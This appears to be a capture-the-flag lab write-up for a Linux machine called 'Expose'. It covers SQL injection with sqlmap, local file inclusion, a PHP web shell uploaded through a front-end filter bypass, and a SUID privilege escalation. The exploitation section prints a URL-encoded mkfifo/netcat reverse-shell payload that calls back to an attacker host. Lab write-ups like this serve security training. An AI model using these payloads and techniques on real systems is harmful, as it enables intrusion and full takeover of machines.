Expose

Target IP: 10.10.4.61

Exposing unnecessary services in a machine can be dangerous. Can you capture the flags and pwn the machine? Use your red teaming knowledge to pwn a Linux machine.

Reconnaissance


There are five ports open on the target machine, as shown above.

Enumeration

Port 21: FTP

The FTP application is open on port 21. However, I did not find anything. And I do not have upload permission too.

Port 1337: HTTP

Browsing to this port displays the webpage above. The source-code of this webpage does not contain anything useful either.


Doing a directory search shows the interesting directories above. The entries /admin and /admin_101 are the most interesting to me.


Browsing to /admin_101 shows the webpage above. One of the input field contains the data hacker@root.thm already.


Viewing the source code of /admin_101 contains the JavaScript above. If the login is successful, the chat.php is shown; otherwise, some sort of data is output to console and a message box is shown. What is this data?


I sent an invalid password and caught the interesting data in console, as shown above. It looks like SQL is used at the backend. Is the target machine vulnerable to SQL injection?


And bingo! Sending the username hacker@root.thm' AND outputs the SQL syntax error in console, as shown above. It looks like the email parameter is vulnerable to SQL injection. Time to perform SQL injection!

Exploitation


I made a POST call and intercepted this using BurpSuite. I stored the POST request in a text file called req.txt. Using the command sqlmap -u http://10.10.4.61:1337/admin_101/ --dump, I followed up on the request and obtained the dump above. There are two tables: config and user. The first table contains entries to interesting URLs. The second table contains the password of the user hacker@root.thm.


Using the password VeryDifficultPassword!!#@#@!#!@#1231, I gained access to the /admin_101 panel. The webpage above is displayed after logging in successfully. However, I did not find anything useful here.


Browsing to http://10.10.4.61:1337/file1010111/index.php displays the webpage above. I should be able to enter the password easytohack to gain access.


The webpage above is shown after entering the password easytohack at http://10.10.4.61:1337/file1010111/index.php. The source-code of this page contains the interesting HTML comment Hint: Try file or view as GET parameters?.


And bingo! Using the parameter file, I can perform LFI. I included the /etc/passwd file above. There is an interesting user called zeamkish. From previous enumeration, I know only this user can access the file upload-cv00101011/index.php according to the SQL dump.


And browsing to upload-cv00101011/index.php shows the webpage above. It is asking for the name of the user zeamkish.


And inputting the username zeamkish shows the webpage above. It looks like a file upload functionality. Only JPG and PNG can be uploaded. I tried to upload a basic PHP shell but it did not work.


It looks like the front-end is handling the upload functionality. I made the changes to the code as shown above. After doing this, I successfully uploaded my PHP webshell.


After the successful upload, the HTML code contains the hidden HTML comment hinting towards to the /upload_thm_1001 directory.


And browsing to http://10.10.4.61:1337/upload-cv00101011/upload_thm_1001/, I can see my two uploaded PHP web shells as shown above.


Now I can access my simple web shell. Time to leverage this to a reverse shell connection.


And done. Using the simple web shell, I sent the payload rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.14.55.153%208443%20%3E%2Ftmp%2Ff to obtain a reverse shell connection on my machine at port 8443. Now I have a foothold on the target machine.

Privilege Escalation


The user zeamkish contains a file called ssh_creds.txt. This file contains this user's password for the SSH application. In the picture above, I connected to the target machine via SSH using his password and got a hit.


Running the command find / -perm -u=s -type f 2>/dev/null shows /usr/bin/nano and /usr/bin/find have SUID bit set.


Using the find binary, I escalated my privileges to root. Now I have a root shell! I tried to use nano, but this did not work.
